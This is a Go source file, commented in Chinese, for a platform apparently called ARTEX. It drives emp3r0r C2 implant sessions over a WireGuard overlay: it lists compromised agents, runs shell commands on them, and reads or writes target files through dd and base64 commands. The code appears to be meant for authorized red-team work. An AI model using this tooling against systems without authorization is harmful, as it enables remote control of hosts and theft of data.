// emp3r0r.go 是 emp3r0r C2 反向植入会话驱动（期 reverse 类型落地）。
//
// 桥接形态：emp3r0r cc（server 模式）作为 sidecar 进程/容器运行，ARTEX 只经
// 其 operator API 通信，不链接 emp3r0r 代码（GPL-3.0 规避）。v5 的 operator 面是
// HTTP POST + CBOR 请求体（Content-Type: application/cbor，operator_session
// 头），但服务端绑定在 userspace WireGuard netstack 上——只有已 provisioning 的
// WG peer 或同主机回环可达。本驱动以 wireguard-go netstack 在本进程内拉起一个
// operator peer（MIT 依赖），用 provisioning 的 operator 凭据接入 cc 的 WG
// overlay，之后按 HTTP+CBOR 调 operator 接口：
//
//   - POST /operator/send_command          下发命令，结果经 msg_tunnel 回流
//   - POST /operator/list_connected_agents 在线 agent 列表（上线轮询用）
//   - POST /operator/forget_agent          摘除离线 agent（部署排错用）
//   - WS   /operator/msg_tunnel            CBOR OperatorMsg 流：命令结果按 JobID 回流
//
// 诚实语义与 HTTPShell 一致：失败返回带原因的 *session.Error，不伪造成功；
// stderr 恒空（emp3r0r 命令通道不分离 stderr，合并进 stdout）。
package session

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

// Emp3r0rConfig 是 cc 连接凭据。凭据来自 cc 端 wg_config.json provisioning
// （operator 名字可自定义，默认 artex）。OperatorPort 是 cc --operator-port+1
// 的 operator HTTP 端口；Endpoint 是 cc 的 WG UDP 监听 host:port。
type Emp3r0rConfig struct {
	Endpoint     string // cc WG UDP 端点 host:port（operator-port 端口）
	ServerKey    string // cc WG server 公钥
	ServerIP     string // cc WG server IP（netstack 地址，operator HTTP 在此监听）
	OperatorIP   string // 本平台 operator 的 WG IP
	OperatorKey  string // 本平台 operator 的 WG 私钥
	OperatorPort int    // operator HTTP 端口；0 = Endpoint 端口+1
	SessionID    string // operator_session 头值；空 = OperatorIP
}

// ccDialFunc 是可注入的底层拨号：生产 = WG netstack DialContext；测试 = 普通 TCP。
type ccDialFunc func(ctx context.Context, network, addr string) (net.Conn, error)

// ---- operator API 协议载荷（wire interop，非 emp3r0r 代码） ----

// ccOperation 对应 def.Operation（CBOR keyasint）。
type ccOperation struct {
	AgentTag string  `cbor:"1,keyasint"`
	Action   string  `cbor:"2,keyasint"`
	Command  *string `cbor:"3,keyasint"`
	JobID    *string `cbor:"8,keyasint"`
}

// CCAgent 对应 def.Emp3r0rAgent 中本平台关心的字段。
type CCAgent struct {
	Tag      string   `cbor:"1,keyasint"`
	Name     string   `cbor:"2,keyasint"`
	Hostname string   `cbor:"5,keyasint"`
	OS       string   `cbor:"11,keyasint"`
	GOOS     string   `cbor:"12,keyasint"`
	IPs      []string `cbor:"16,keyasint"`
	User     string   `cbor:"18,keyasint"`
	HasRoot  bool     `cbor:"19,keyasint"`
	UUID     string   `cbor:"27,keyasint"`
}

// CCOperatorMsg 对应 def.OperatorMsg（msg_tunnel 回流信封）。
type CCOperatorMsg struct {
	JobID    string   `cbor:"1,keyasint"`
	CmdSlice []string `cbor:"2,keyasint"`
	Response []byte   `cbor:"3,keyasint"`
	Tag      string   `cbor:"4,keyasint"`
}

// ccOpPaths 是 operator API 路径（相对 RootURL）。
const (
	ccPathSendCommand = "operator/send_command"
	ccPathListAgents  = "operator/list_connected_agents"
	ccPathForgetAgent = "operator/forget_agent"
	ccPathMsgTunnel   = "operator/msg_tunnel"
)

const (
	ccHTTPTimeout = 20 * time.Second
	// ccJobChanCap 是单 job 结果缓冲（结果一帧即可，留余量防阻塞读循环）。
	ccJobChanCap = 4
	// empWriteChunk 是 WriteFile 单次命令行内联的原始字节上限（base64 后约 44KB)。
	empWriteChunk = 32 * 1024
	// empReadChunk 是 ReadFile 单次 dd 读取上限（msg_tunnel 帧上限 4MB)。
	empReadChunk = 1 << 20
	// empMaxReadSize 是 ReadFile 兜底上限，防异常目标无限输出。
	empMaxReadSize = 64 << 20
)

// CCClient 是 emp3r0r cc operator API 桥接客户端。并发安全。
// WG peer 惰性拉起：首调用才握手，sidecar 未就绪时构造不失败（诚实上报拨号错误）。
type CCClient struct {
	cfg  Emp3r0rConfig
	root string // 测试注入的 API 根；空 = 由 cfg.ServerIP+OperatorPort 拼
	dial ccDialFunc

	hc      *http.Client
	wsDial  *websocket.Dialer
	wgClose func() error // WG device 回收；注入拨号时为 nil

	wgOnce sync.Once
	wgErr  error

	tunMu    sync.Mutex
	tunConn  *websocket.Conn
	tunAlive bool
	tunErr   error

	jobs sync.Map // jobID → chan CCOperatorMsg

	// OnNotify 是通知类回流（INFO/WARN/SUCCESS 等非 job 帧）可选回调；
	// server 层上线轮询不需要它（list 轮询为准），留作扩展。
	OnNotify func(*CCOperatorMsg)
}

// NewCCClient 构造桥接客户端。WG peer 不立即拉起——见 type 注释。
func NewCCClient(cfg Emp3r0rConfig) (*CCClient, error) {
	c := &CCClient{cfg: cfg}
	c.dial = func(ctx context.Context, network, addr string) (net.Conn, error) {
		return c.wgDial(ctx, network, addr)
	}
	c.hc = &http.Client{
		Timeout:   ccHTTPTimeout,
		Transport: &http.Transport{DialContext: c.dial},
	}
	c.wsDial = &websocket.Dialer{
		HandshakeTimeout: ccHTTPTimeout,
		NetDialContext:   c.dial,
		Subprotocols:     nil,
		ReadBufferSize:   64 * 1024,
		WriteBufferSize:  64 * 1024,
	}
	return c, nil
}

// newTestCCClient 是测试构造口：注入拨号（绕过 WG）与根地址。
// 仅供本包测试使用。
func newTestCCClient(root, sessionID string, dial ccDialFunc) *CCClient {
	c := &CCClient{
		cfg:  Emp3r0rConfig{SessionID: sessionID},
		root: root,
		dial: dial,
	}
	c.hc = &http.Client{
		Timeout:   ccHTTPTimeout,
		Transport: &http.Transport{DialContext: dial},
	}
	c.wsDial = &websocket.Dialer{
		HandshakeTimeout: ccHTTPTimeout,
		NetDialContext:   dial,
	}
	return c
}

// rootURL 是 operator HTTP 根：http://<ServerIP>:<OperatorPort>。
func (c *CCClient) rootURL() string {
	if c.root != "" {
		return c.root
	}
	port := c.cfg.OperatorPort
	if port <= 0 {
		_, ep, err := net.SplitHostPort(c.cfg.Endpoint)
		if err == nil {
			var p int
			if n, perr := fmt.Sscanf(ep, "%d", &p); n == 1 && perr == nil {
				port = p + 1
			}
		}
	}
	if port <= 0 {
		port = 13378
	}
	return fmt.Sprintf("http://%s:%d", c.cfg.ServerIP, port)
}

func (c *CCClient) sessionID() string {
	if c.cfg.SessionID != "" {
		return c.cfg.SessionID
	}
	return c.cfg.OperatorIP
}

// wgDial 惰性拉起 userspace WG peer 并经它拨号。
func (c *CCClient) wgDial(ctx context.Context, network, addr string) (net.Conn, error) {
	c.wgOnce.Do(func() {
		dial, closeFn, err := wgPeerDialer(c.cfg)
		if err != nil {
			c.wgErr = err
			return
		}
		c.dial = dial // 后续调用直接走已起设备
		c.wgClose = closeFn
		c.hc.Transport.(*http.Transport).DialContext = dial
		c.wsDial.NetDialContext = dial
	})
	if c.wgErr != nil {
		return nil, c.wgErr
	}
	return c.dial(ctx, network, addr)
}

// post 发一条 CBOR POST；out 非 nil 时解码响应体。
func (c *CCClient) post(ctx context.Context, path string, req, out any) error {
	var body io.Reader
	if req != nil {
		b, err := cbor.Marshal(req)
		if err != nil {
			return fmt.Errorf("cbor 编码失败: %w", err)
		}
		body = strings.NewReader(string(b))
	}
	hreq, err := http.NewRequestWithContext(ctx, http.MethodPost,
		c.rootURL()+"/"+path, body)
	if err != nil {
		return err
	}
	hreq.Header.Set("Content-Type", "application/cbor")
	hreq.Header.Set("operator_session", c.sessionID())
	resp, err := c.hc.Do(hreq)
	if err != nil {
		return fmt.Errorf("cc 连接失败: %w", err)
	}
	defer resp.Body.Close()
	rb, err := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	if err != nil {
		return fmt.Errorf("cc 响应读取失败: %w", err)
	}
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("cc %s → HTTP %d: %s", path, resp.StatusCode,
			strings.TrimSpace(string(rb)))
	}
	if out != nil && len(rb) > 0 {
		if err := cbor.Unmarshal(rb, out); err != nil {
			return fmt.Errorf("cc 响应 cbor 解码失败: %w", err)
		}
	}
	return nil
}

// Agents 列在线 agent（上线轮询与 Test 共用）。
func (c *CCClient) Agents(ctx context.Context) ([]CCAgent, error) {
	var list []CCAgent
	if err := c.post(ctx, ccPathListAgents, nil, &list); err != nil {
		return nil, err
	}
	return list, nil
}

// Ping 是 doctor/探活用的连通性检查：拉起 WG + 列一次 agent。
func (c *CCClient) Ping(ctx context.Context) error {
	_, err := c.Agents(ctx)
	return err
}

// ForgetAgent 让 cc 摘除一条（离线）agent——部署排错清理用，不关会话本身。
func (c *CCClient) ForgetAgent(ctx context.Context, tag string) error {
	return c.post(ctx, ccPathForgetAgent, ccOperation{AgentTag: tag}, nil)
}

// ensureTunnel 保证 msg_tunnel ws 已连（结果回流通道）。断开时重连；
// 每次重连把滞留 job 判死（结果丢在旧连接里，诚实上报超时）。
func (c *CCClient) ensureTunnel(ctx context.Context) error {
	c.tunMu.Lock()
	defer c.tunMu.Unlock()
	if c.tunAlive {
		return nil
	}
	ws := strings.Replace(c.rootURL(), "http://", "ws://", 1) + "/" + ccPathMsgTunnel
	conn, resp, err := c.wsDial.DialContext(ctx, ws, http.Header{
		"operator_session": {c.sessionID()},
	})
	if err != nil {
		return fmt.Errorf("msg_tunnel 连接失败: %w", err)
	}
	if resp != nil && resp.StatusCode != http.StatusSwitchingProtocols {
		_ = conn.Close()
		return fmt.Errorf("msg_tunnel 握手失败: HTTP %d", resp.StatusCode)
	}
	c.tunConn = conn
	c.tunAlive = true
	c.tunErr = nil
	go c.tunReadLoop(conn)
	return nil
}

// tunReadLoop 持续读 msg_tunnel：每条 ws message 内可有多个 CBOR 帧
// （emp3r0r 侧按 NetConn 流写），逐帧解码分发。JobID 帧进 job 队列；其余进
// OnNotify。读死即标记 tunnel 断线，滞留 job 全部判超时。
func (c *CCClient) tunReadLoop(conn *websocket.Conn) {
	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			break
		}
		dec := cbor.NewDecoder(strings.NewReader(string(data)))
		for {
			var msg CCOperatorMsg
			if derr := dec.Decode(&msg); derr != nil {
				break // 帧边界/EOF/坏帧：丢弃剩余
			}
			c.dispatch(&msg)
		}
	}
	c.tunMu.Lock()
	c.tunAlive = false
	c.tunErr = errors.New("msg_tunnel 断线")
	c.tunMu.Unlock()
	// 滞留 job 判死：结果随旧连接丢了，等待方收到超时语义。
	c.jobs.Range(func(k, v any) bool {
		c.jobs.Delete(k)
		if ch, ok := v.(chan CCOperatorMsg); ok {
			select {
			case ch <- CCOperatorMsg{Tag: "_tunnel_dead"}:
			default:
			}
		}
		return true
	})
}

func (c *CCClient) dispatch(msg *CCOperatorMsg) {
	if msg == nil {
		return
	}
	if msg.JobID != "" {
		if ch, ok := c.jobs.Load(msg.JobID); ok {
			select {
			case ch.(chan CCOperatorMsg) <- *msg:
			default:
			}
			return
		}
	}
	if c.OnNotify != nil {
		c.OnNotify(msg)
	}
}

// SendCommand 下发 shell 命令并按 JobID 等待结果回流。timeout<=0 用默认 60s。
// stderr 恒空（emp3r0r 通道合并输出）。断线/超时/agent 不存在都返回带原因错误。
func (c *CCClient) SendCommand(ctx context.Context, agentTag, cmd string, timeout time.Duration) (string, error) {
	if timeout <= 0 {
		timeout = 60 * time.Second
	}
	if err := c.ensureTunnel(ctx); err != nil {
		return "", err
	}
	jobID := uuid.NewString()
	ch := make(chan CCOperatorMsg, ccJobChanCap)
	c.jobs.Store(jobID, ch)
	defer c.jobs.Delete(jobID)

	op := ccOperation{AgentTag: agentTag, Action: "command", Command: &cmd, JobID: &jobID}
	if err := c.post(ctx, ccPathSendCommand, op, nil); err != nil {
		return "", err
	}
	timer := time.NewTimer(timeout)
	defer timer.Stop()
	for {
		select {
		case msg := <-ch:
			if msg.Tag == "_tunnel_dead" {
				return "", errors.New("命令结果回流通道断线（msg_tunnel）")
			}
			return string(msg.Response), nil
		case <-ctx.Done():
			return "", ctx.Err()
		case <-timer.C:
			return "", fmt.Errorf("agent %s 命令结果超时（%s 无回流；agent 可能掉线或被抢占）",
				agentTag, timeout)
		}
	}
}

// Close 释放 WG peer 与 msg_tunnel。
func (c *CCClient) Close() error {
	c.tunMu.Lock()
	if c.tunConn != nil {
		_ = c.tunConn.Close()
	}
	c.tunAlive = false
	c.tunMu.Unlock()
	if c.wgClose != nil {
		return c.wgClose()
	}
	return nil
}

// ---- Session 接口实现 ----

// Emp3r0r 是一条 emp3r0r agent 会话。零值不可用，经 NewEmp3r0r/RestoreEmp3r0r 构造。
type Emp3r0r struct {
	id       int64
	agentTag string
	host     string // 目标主机名/首选 IP（展示与 RoE 用）
	cc       *CCClient
}

// NewEmp3r0r 构造 agent 会话（不落库；落库后 SetID）。
func NewEmp3r0r(agentTag, host string, cc *CCClient) (*Emp3r0r, error) {
	if strings.TrimSpace(agentTag) == "" {
		return nil, fmt.Errorf("agent tag 为空")
	}
	if cc == nil {
		return nil, fmt.Errorf("cc 客户端未就绪")
	}
	return &Emp3r0r{agentTag: agentTag, host: strings.TrimSpace(host), cc: cc}, nil
}

// RestoreEmp3r0r 由 DB secret 重建会话（启动恢复，不重探）。
func RestoreEmp3r0r(id int64, sec Secret, cc *CCClient) (*Emp3r0r, error) {
	e, err := NewEmp3r0r(sec.AgentTag, hostFromEmpURL(sec.URL), cc)
	if err != nil {
		return nil, err
	}
	e.id = id
	return e, nil
}

func (e *Emp3r0r) ID() int64    { return e.id }
func (e *Emp3r0r) Kind() string { return "emp3r0r" }

// SetID 落库回填主键。
func (e *Emp3r0r) SetID(id int64) { e.id = id }

// Host 返回目标展示主机（hostname 或首选 IP）。
func (e *Emp3r0r) Host() string { return e.host }

// AgentTag 返回 cc 侧 agent tag。
func (e *Emp3r0r) AgentTag() string { return e.agentTag }

// Secret 导出落库参数：URL=emp3r0r://<host>，AgentTag 走新增字段。
func (e *Emp3r0r) Secret() Secret {
	return Secret{
		URL:      "emp3r0r://" + e.host,
		AgentTag: e.agentTag,
	}
}

func hostFromEmpURL(raw string) string {
	return strings.TrimPrefix(raw, "emp3r0r://")
}

// Test 做无害探活：向 agent 下发 echo 哨兵，回显命中才判活。
// 失败返回带原因错误（掉线/锁被抢占/命令超时）。
func (e *Emp3r0r) Test(ctx context.Context) error {
	sent := "artex_probe_" + hexToken(4)
	out, err := e.cc.SendCommand(ctx, e.agentTag, "echo "+sent, 15*time.Second)
	if err != nil {
		return opError("test", "agent %s 探活失败：%v", e.agentTag, err)
	}
	if !strings.Contains(out, sent) {
		return opError("test", "agent %s 回显哨兵缺失（agent 可能失效或被拦截）", e.agentTag)
	}
	return nil
}

// Exec 在 agent 侧执行一条 shell 命令。stderr 恒空。
func (e *Emp3r0r) Exec(ctx context.Context, cmd string, timeout time.Duration) (stdout, stderr string, err error) {
	out, err := e.cc.SendCommand(ctx, e.agentTag, cmd, timeout)
	if err != nil {
		return "", "", opError("exec", "agent %s 执行失败：%v", e.agentTag, err)
	}
	return out, "", nil
}

// ReadFile 分块 dd 读目标文件（CBOR Response 是原始字节，不经文本变换）。
// 先 wc -c 验可读性与拿大小；读空即 EOF。不存在/不可读返回带原因错误。
func (e *Emp3r0r) ReadFile(ctx context.Context, path string) ([]byte, error) {
	p := shQuote(path)
	sizeOut, err := e.cc.SendCommand(ctx, e.agentTag,
		fmt.Sprintf("wc -c < %s 2>/dev/null", p), 15*time.Second)
	if err != nil {
		return nil, opError("read", "%s", err)
	}
	var size int64
	if n, perr := fmt.Sscanf(strings.TrimSpace(sizeOut), "%d", &size); n != 1 || perr != nil {
		return nil, opError("read", "文件 %s 不可读（不存在或权限不足，wc -c 无输出）", path)
	}
	if size > empMaxReadSize {
		return nil, opError("read", "文件 %s 过大（%d 字节，上限 %d）", path, size, empMaxReadSize)
	}
	var out []byte
	for off := int64(0); off < size; {
		blk, err := e.cc.SendCommand(ctx, e.agentTag,
			fmt.Sprintf("dd if=%s bs=%d skip=%d count=1 2>/dev/null", p, empReadChunk, off/empReadChunk), 60*time.Second)
		if err != nil {
			return nil, opError("read", "%s", err)
		}
		out = append(out, blk...)
		if len(blk) < empReadChunk {
			break // 短读 = EOF
		}
		off += int64(len(blk))
	}
	if int64(len(out)) != size {
		return nil, opError("read", "文件 %s 读取不完整（应 %d 实 %d 字节）", path, size, len(out))
	}
	return out, nil
}

// WriteFile 分块 base64 写目标文件。先探测目标 base64 可用性；写完 wc -c 校验大小。
func (e *Emp3r0r) WriteFile(ctx context.Context, path string, data []byte) error {
	p := shQuote(path)
	probe, err := e.cc.SendCommand(ctx, e.agentTag, "command -v base64", 15*time.Second)
	if err != nil {
		return opError("write", "%s", err)
	}
	if strings.TrimSpace(probe) == "" {
		return opError("write", "目标侧无 base64，二进制安全写入不可用（诚实拒绝）")
	}
	for off := 0; off < len(data) || off == 0; {
		end := off + empWriteChunk
		if end > len(data) {
			end = len(data)
		}
		b64 := base64.StdEncoding.EncodeToString(data[off:end])
		redir := ">>"
		if off == 0 {
			redir = ">"
		}
		cmd := fmt.Sprintf("printf '%%s' '%s' | base64 -d %s %s", b64, redir, p)
		if _, err := e.cc.SendCommand(ctx, e.agentTag, cmd, 60*time.Second); err != nil {
			return opError("write", "%s", err)
		}
		off = end
		if len(data) == 0 {
			break // 空文件：单趟 '>' 建立
		}
	}
	sizeOut, err := e.cc.SendCommand(ctx, e.agentTag,
		fmt.Sprintf("wc -c < %s 2>/dev/null", p), 15*time.Second)
	if err != nil {
		return opError("write", "%s", err)
	}
	var size int64
	if n, perr := fmt.Sscanf(strings.TrimSpace(sizeOut), "%d", &size); n != 1 || perr != nil || size != int64(len(data)) {
		return opError("write", "文件 %s 写入校验失败（应 %d 实 %s 字节）", path, len(data), strings.TrimSpace(sizeOut))
	}
	return nil
}

// Close 是视图级释放：会话登记删除不关 cc 侧 agent（implant 仍在）。
func (e *Emp3r0r) Close(context.Context) error { return nil }

// shQuote 给 shell 参数加单引号并转义内嵌单引号。
func shQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// hexToken 返回 n 字节随机 hex（哨兵用）。
func hexToken(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
